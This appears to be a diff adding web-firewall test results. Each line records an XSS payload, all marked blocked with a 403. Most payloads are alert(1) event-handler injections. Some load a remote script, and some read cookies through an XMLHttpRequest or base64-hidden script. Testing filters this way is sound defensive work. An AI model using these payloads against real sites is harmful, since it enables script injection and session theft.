+{"payload": "<style>:target {color:red;}</style><tfoot id=x style=\"transition:color 1s\" ontransitionend=alert(1)></tfoot>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003925355995306745}
+{"payload": "<summary id=x tabindex=1 onfocus=alert(1)></summary>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004549031000351533}
+{"payload": "<dd onmouseover=\"alert(1)\">test</dd>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004307291004806757}
+{"payload": "<dl draggable=\"true\" ondragenter=\"alert(1)\">test</dl>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004036701007862575}
+{"payload": "<picture onkeyup=\"alert(1)\" contenteditable>test</picture>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0042382620013086125}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004671243004850112}
+{"payload": "<dt draggable=\"true\" ondragend=\"alert(1)\">test</dt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004920999999740161}
+{"payload": "<font id=x tabindex=1 onbeforeactivate=alert(1)></font>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004179783005383797}
+{"payload": "<ol onkeypress=\"alert(1)\" contenteditable>test</ol>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005066498997621238}
+{"payload": "<form action=javascript:alert(1)><input type=submit>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004277627987903543}
+{"payload": "<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00552043599600438}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><html ondrop=alert(1) contenteditable>drop here</html>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004939651989843696}
+{"payload": "<acronym onkeypress=\"alert(1)\" contenteditable>test</acronym>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005528492998564616}
+{"payload": "<object id=x tabindex=1 onbeforeactivate=alert(1)></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004404114006320015}
+{"payload": "<body oncut=\"alert(1)\" contenteditable>test</body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036196139990352094}
+{"payload": "<hgroup onclick=\"alert(1)\">test</hgroup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003214921001926996}
+{"payload": "<svg><bdi onload=alert(1)></bdi>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032870889990590513}
+{"payload": "<track onkeydown=\"alert(1)\" contenteditable>test</track>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003271888999734074}
+{"payload": "<select id=x tabindex=1 onbeforeactivate=alert(1)></select>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035932730097556487}
+{"payload": "<section onmouseover=\"alert(1)\">test</section>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003852435009321198}
+{"payload": "<rt oncopy=\"alert(1)\" contenteditable>test</rt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003528062006807886}
+{"payload": "<q onmousedown=\"alert(1)\">test</q>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037932139966869727}
+{"payload": "<section draggable=\"true\" ondragstart=\"alert(1)\">test</section>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003593959001591429}
+{"payload": "<ins oncopy=\"alert(1)\" contenteditable>test</ins>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033097870036726817}
+{"payload": "<colgroup ondblclick=\"alert(1)\">test</colgroup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033082419977290556}
+{"payload": "<tbody draggable=\"true\" ondrag=\"alert(1)\">test</tbody>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003371618004166521}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034269550087628886}
+{"payload": "<section onmouseenter=\"alert(1)\">test</section>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003974330989876762}
+{"payload": "<html onpaste=\"alert(1)\" contenteditable>test</html>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006825317002949305}
+{"payload": "<listing draggable=\"true\" ondrag=\"alert(1)\">test</listing>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005556446005357429}
+{"payload": "<figcaption onmouseenter=\"alert(1)\">test</figcaption>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004707894011517055}
+{"payload": "<meter onmouseleave=\"alert(1)\">test</meter>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003870448999805376}
+{"payload": "<hr onmousemove=\"alert(1)\">test</hr>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003486696004983969}
+{"payload": "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038012150034774095}
+{"payload": "<noscript onmouseup=\"alert(1)\">test</noscript>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038936749915592372}
+{"payload": "<style>@keyframes x{}</style><element style=\"animation-name:x\" onanimationend=\"alert(1)\"></element>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035454199969535694}
+{"payload": "<style>:target {color: red;}</style><caption id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></caption>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004683103004936129}
+{"payload": "<dd onpaste=\"alert(1)\" contenteditable>test</dd>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037200180086074397}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></embed>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003678538996609859}
+{"payload": "<br onmouseleave=\"alert(1)\">test</br>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003534147996106185}
+{"payload": "<basefont onmousemove=\"alert(1)\">test</basefont>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033491089998278767}
+{"payload": "<pre draggable=\"true\" ondragstart=\"alert(1)\">test</pre>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038114150083856657}
+{"payload": "<button draggable=\"true\" ondragleave=\"alert(1)\">test</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003777780002565123}
+{"payload": "<area onpaste=\"alert(1)\" contenteditable>test</area>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035502800019457936}
+{"payload": "<ul onmouseleave=\"alert(1)\">test</ul>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033966510090976954}
+{"payload": "<style>@keyframes x{}</style><menuitem style=\"animation-name:x\" onanimationstart=\"alert(1)\"></menuitem>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003693386010127142}
+{"payload": "<source id=x tabindex=1 onfocusin=alert(1)></source>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004284251001081429}
+{"payload": "<legend oncut=\"alert(1)\" contenteditable>test</legend>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003577462994144298}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003736851009307429}
+{"payload": "<h1 oncopy=\"alert(1)\" contenteditable>test</h1>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034233230107929558}
+{"payload": "<svg><figcaption onload=alert(1)></figcaption>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035537649964680895}
+{"payload": "<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003480084997136146}
+{"payload": "<style>@keyframes x{}</style><bdo style=\"animation-name:x\" onanimationend=\"alert(1)\"></bdo>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036186719953548163}
+{"payload": "<x 1='1'onxxx=1", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032713580003473908}
+{"payload": "<image xlink:href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E\"/>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037890320090809837}
+{"payload": "<dialog onkeydown=\"alert(1)\" contenteditable>test</dialog>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003316005997476168}
+{"payload": "<rtc onbeforecut=\"alert(1)\" contenteditable>test</rtc>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035611920029623434}
+{"payload": "<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037039169983472675}
+{"payload": "<xmp onkeypress=\"alert(1)\" contenteditable>test</xmp>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034412069944664836}
+{"payload": "<content onblur=alert(1) tabindex=1 id=x></content><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003848337000817992}
+{"payload": "<span onmousedown=\"alert(1)\">test</span>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00347258998954203}
+{"payload": "<em onmousemove=\"alert(1)\">test</em>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003332236999995075}
+{"payload": "<hr draggable=\"true\" ondragenter=\"alert(1)\">test</hr>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034234630002174526}
+{"payload": "<kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036594910052372143}
+{"payload": "<style>@keyframes x{}</style><dt style=\"animation-name:x\" onanimationstart=\"alert(1)\"></dt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003969983008573763}
+{"payload": "<style onblur=alert(1) tabindex=1 id=x></style><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035295280104037374}
+{"payload": "<style>@keyframes x{}</style><article style=\"animation-name:x\" onanimationstart=\"alert(1)\"></article>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035270240041427314}
+{"payload": "<fieldset onmousedown=\"alert(1)\">test</fieldset>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004742103992612101}
+{"payload": "<style>:target {color:red;}</style><nav id=x style=\"transition:color 1s\" ontransitionend=alert(1)></nav>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004897039994830266}
+{"payload": "<nextid oncontextmenu=\"alert(1)\">test</nextid>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038371299888240173}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><var id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></var>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0039076919929357246}
+{"payload": "<select autofocus onfocusin=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003714478007168509}
+{"payload": "<style>:target {color: red;}</style><template id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></template>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003551642003003508}
+{"payload": "<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003939513000659645}
+{"payload": "<iframe src=\"http://example.org/\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033269060077145696}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><em ondrop=alert(1) contenteditable>drop here</em>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038476459885714576}
+{"payload": "<style draggable=\"true\" ondragstart=\"alert(1)\">test</style>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003459935003775172}
+{"payload": "<nav onmousemove=\"alert(1)\">test</nav>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034627300046849996}
+{"payload": "<tt onclick=\"alert(1)\">test</tt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033779249934013933}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035658540000440553}
+{"payload": "<IMG SRC=\" &#14;  javascript:alert('XSS');\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004603506997227669}
+{"payload": "<a href=\"javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00651175799430348}
+{"payload": "<basefont onpaste=\"alert(1)\" contenteditable>test</basefont>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004502784999203868}
+{"payload": "<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004034729994600639}
+{"payload": "<noscript onmouseout=\"alert(1)\">test</noscript>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004003517999080941}
+{"payload": "<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004815991997020319}
+{"payload": "<style>@keyframes slidein {}</style><ul style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></ul>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0044504739926196635}
+{"payload": "<figcaption draggable=\"true\" ondragleave=\"alert(1)\">test</figcaption>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004204877986921929}
+{"payload": "<a onbeforecut=\"alert(1)\" contenteditable>test</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038178480026545003}
+{"payload": "<option id=x tabindex=1 ondeactivate=alert(1)></option><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035519319935701787}
+{"payload": "<base oncontextmenu=\"alert(1)\">test</base>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003625735000241548}
+{"payload": "<cite onkeyup=\"alert(1)\" contenteditable>test</cite>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003542815989931114}
+{"payload": "<main onkeypress=\"alert(1)\" contenteditable>test</main>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003526253000018187}
+{"payload": "<colgroup oncontextmenu=\"alert(1)\">test</colgroup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003382082999451086}
+{"payload": "<abbr onkeypress=\"alert(1)\" contenteditable>test</abbr>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00367164499766659}
+{"payload": "<br onpaste=\"alert(1)\" contenteditable>test</br>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036505540047073737}
+{"payload": "<figcaption onmouseup=\"alert(1)\">test</figcaption>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034706090082181618}
+{"payload": "<embed src=1 onerror=alert(1) type=image/gif>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033979989966610447}
+{"payload": "<textarea oncopy=alert(1) autofocus>XSS</textarea>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034923870116472244}
+{"payload": "<div id=\"137\"><svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033689690026221797}
+{"payload": "<image id=x tabindex=1 onfocus=alert(1)></image>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00339657100266777}
+{"payload": "<div id=\"136\"><form action=\"\" method=\"post\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003786536995903589}
+{"payload": "<body onfocusout=alert(1) id=x><iframe id=x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035459899954730645}
+{"payload": "<option onpaste=\"alert(1)\" contenteditable>test</option>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037644549884134904}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><xmp id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></xmp>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038350710092345253}
+{"payload": "<kbd oncontextmenu=\"alert(1)\">test</kbd>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003177686987328343}
+{"payload": "<b onmouseenter=\"alert(1)\">test</b>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003423859001486562}
+{"payload": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003630510007496923}
+{"payload": "<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037865379999857396}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035135770012857392}
+{"payload": "<style>:target {color: red;}</style><element id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></element>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00350283199804835}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00355035399843473}
+{"payload": "<samp onclick=\"alert(1)\">test</samp>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003668891004053876}
+{"payload": "<label id=x tabindex=1 onfocus=alert(1)></label>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034575889876578003}
+{"payload": "<template id=x tabindex=1 onfocus=alert(1)></template>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035222839942434803}
+{"payload": "<td ondblclick=\"alert(1)\">test</td>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036712680011987686}
+{"payload": "<rp draggable=\"true\" ondragleave=\"alert(1)\">test</rp>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004416352996486239}
+{"payload": "<video autoplay controls onseeked=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003909795996150933}
+{"payload": "<button onmousemove=\"alert(1)\">test</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036797999928239733}
+{"payload": "<table draggable=\"true\" ondragenter=\"alert(1)\">test</table>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003862935001961887}
+{"payload": "<style>@keyframes x{}</style><button style=\"animation-name:x\" onanimationstart=\"alert(1)\"></button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038984440034255385}
+{"payload": "<track id=x tabindex=1 onbeforedeactivate=alert(1)></track><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003513428004225716}
+{"payload": "<maction actiontype=\"statusline\" xlink:href=\"javascript:alert(3)\">CLICKME<mtext>http://http://google.com</mtext></maction>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037441400054376572}
+{"payload": "<hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003634908003732562}
+{"payload": "<marquee onmouseenter=\"alert(1)\">test</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004256768006598577}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004033467004774138}
+{"payload": "<ins onblur=alert(1) tabindex=1 id=x></ins><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003512776005663909}
+{"payload": "<acronym draggable=\"true\" ondrag=\"alert(1)\">test</acronym>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003305555001134053}
+{"payload": "<video onkeydown=\"alert(1)\" contenteditable>test</video>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004209938007988967}
+{"payload": "<header id=x tabindex=1 onbeforeactivate=alert(1)></header>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007312679008464329}
+{"payload": "<td oncut=\"alert(1)\" contenteditable>test</td>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004226899996865541}
+{"payload": "<source onkeydown=\"alert(1)\" contenteditable>test</source>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004134863003855571}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></table>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004152105000684969}
+{"payload": "<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004557499996735714}
+{"payload": "<colgroup draggable=\"true\" ondragstart=\"alert(1)\">test</colgroup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003357591005624272}
+{"payload": "<fieldset draggable=\"true\" ondragend=\"alert(1)\">test</fieldset>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033465409942436963}
+{"payload": "<style>@keyframes x{}</style><ul style=\"animation-name:x\" onanimationstart=\"alert(1)\"></ul>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035529640008462593}
+{"payload": "<tfoot onmouseup=\"alert(1)\">test</tfoot>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033539689902681857}
+{"payload": "<multicol ondblclick=\"alert(1)\">test</multicol>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003554346985765733}
+{"payload": "<style>@keyframes x{}</style><picture style=\"animation-name:x\" onanimationstart=\"alert(1)\"></picture>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004978629003744572}
+{"payload": "<style>:target {color:red;}</style><multicol id=x style=\"transition:color 1s\" ontransitionend=alert(1)></multicol>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003918251997674815}
+{"payload": "<time draggable=\"true\" ondragleave=\"alert(1)\">test</time>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034916750009870157}
+{"payload": "<iframe onmousedown=\"alert(1)\">test</iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034566879912745208}
+{"payload": "<marquee onclick=\"alert(1)\">test</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003894658002536744}
+{"payload": "<samp draggable=\"true\" ondragleave=\"alert(1)\">test</samp>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003539197990903631}
+{"payload": "<summary id=x tabindex=1 onbeforedeactivate=alert(1)></summary><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003448400995694101}
+{"payload": "<meta onmousemove=\"alert(1)\">test</meta>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036143530014669523}
+{"payload": "<style>@keyframes x{}</style><code style=\"animation-name:x\" onanimationend=\"alert(1)\"></code>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034905639913631603}
+{"payload": "<style>@keyframes x{}</style><video style=\"animation-name:x\" onanimationend=\"alert(1)\"></video>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037840680015506223}
+{"payload": "<style>:target {color:red;}</style><a id=x style=\"transition:color 1s\" ontransitionend=alert(1)></a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034954970033140853}
+{"payload": "<slot onkeyup=\"alert(1)\" contenteditable>test</slot>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003583153011277318}
+{"payload": "<img oncontextmenu=\"alert(1)\">test</img>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003513357005431317}
+{"payload": "<dfn onmouseout=\"alert(1)\">test</dfn>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003934019012376666}
+{"payload": "<rb onmouseleave=\"alert(1)\">test</rb>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003448186005698517}
+{"payload": "<svg><dfn onload=alert(1)></dfn>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00369893699826207}
+{"payload": "<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034248360025230795}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable>drop here</optgroup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037160209903959185}
+{"payload": "<dialog id=x tabindex=1 onfocus=alert(1)></dialog>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032931610039668158}
+{"payload": "<h1 onmouseout=\"alert(1)\">test</h1>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032219229906331748}
+{"payload": "<command onbeforepaste=\"alert(1)\" contenteditable>test</command>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00362633699842263}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035171760100638494}
+{"payload": "<td onkeypress=\"alert(1)\" contenteditable>test</td>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003545259009115398}
+{"payload": "<q id=x tabindex=1 onbeforeactivate=alert(1)></q>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003441687993472442}
+{"payload": "<button onkeypress=\"alert(1)\" contenteditable>test</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003876421003951691}
+{"payload": "<col draggable=\"true\" ondragstart=\"alert(1)\">test</col>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036519370041787624}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><tfoot id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></tfoot>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003920226008631289}
+{"payload": "<time onpaste=\"alert(1)\" contenteditable>test</time>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035226809995947406}
+{"payload": "<li oncut=\"alert(1)\" contenteditable>test</li>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037101429916219786}
+{"payload": "<noembed onkeydown=\"alert(1)\" contenteditable>test</noembed>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036153359978925437}
+{"payload": "<blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036497029941529036}
